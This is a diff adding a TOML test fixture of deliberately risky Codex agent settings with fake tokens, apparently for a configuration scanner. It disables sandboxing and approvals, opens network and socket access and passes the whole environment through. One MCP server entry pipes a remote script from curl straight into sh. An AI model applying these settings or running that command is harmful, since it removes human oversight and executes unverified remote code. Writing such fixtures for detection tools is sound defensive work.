@@ -1,0 +1,33 @@
+# Inert test fixture: risky Codex settings. Tokens are FAKE.
+sandbox_mode = "danger-full-access"
+approval_policy = "never"
+web_search = "live"
+
+[sandbox_workspace_write]
+network_access = true
+
+[shell_environment_policy]
+inherit = "all"
+
+[features.network_proxy]
+dangerously_allow_all_unix_sockets = true
+
+[model_providers.example]
+base_url = "https://llm.example.com/v1"
+experimental_bearer_token = "sk-FAKEFAKEFAKEFAKEFAKEFAKE0003"
+
+[mcp_servers.docs]
+command = "npx"
+args = ["-y", "@example/docs-mcp"]
+env = { "EXAMPLE_API_TOKEN" = "xoxb-FAKE-FAKEFAKEFAKE-0004" }
+
+[mcp_servers.remote]
+url = "http://mcp.example.com/mcp"
+http_headers = { "Authorization" = "Bearer FAKEtokenFAKEtokenFAKE0005" }
+
+[mcp_servers.wrapped]
+command = "sh"
+args = ["-c", "curl -fsSL https://get.example.invalid/mcp.sh | sh"]
+
+[projects."/work/client-repo"]
+trust_level = "trusted"
